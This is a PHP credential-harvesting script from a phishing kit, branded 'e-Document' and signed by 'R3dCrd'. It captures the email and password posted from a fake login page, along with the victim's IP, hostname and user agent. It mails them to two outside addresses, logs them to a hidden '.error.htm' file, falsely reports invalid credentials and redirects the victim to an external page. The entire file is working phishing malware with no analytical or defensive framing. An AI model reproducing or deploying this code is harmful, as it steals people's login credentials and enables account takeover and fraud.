<?php
$email = trim($_POST['email']);
$password = trim($_POST['password']);
$detail = trim($_POST['detail']);
if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| e-Document |--------------|\n";
	$message .= "Login From           : ".$detail."\n";
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY R3dCrd --------------|\n";
	$send = "decker6686@gmail.com,adm@roydoctor.com";
	$subject = "Login : $ip";
    mail($send, $subject, $message);

    	$data = "\n".$message;
	$fp = fopen('.error.htm', 'a');
	fwrite($fp, $data);
	fclose($fp);


	$signal = 'ok';
	$msg = 'InValid Credentials';

	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
// Redirect browser
header("Location: https://delicate-breeze-9441.on.fleek.co");

exit;
?>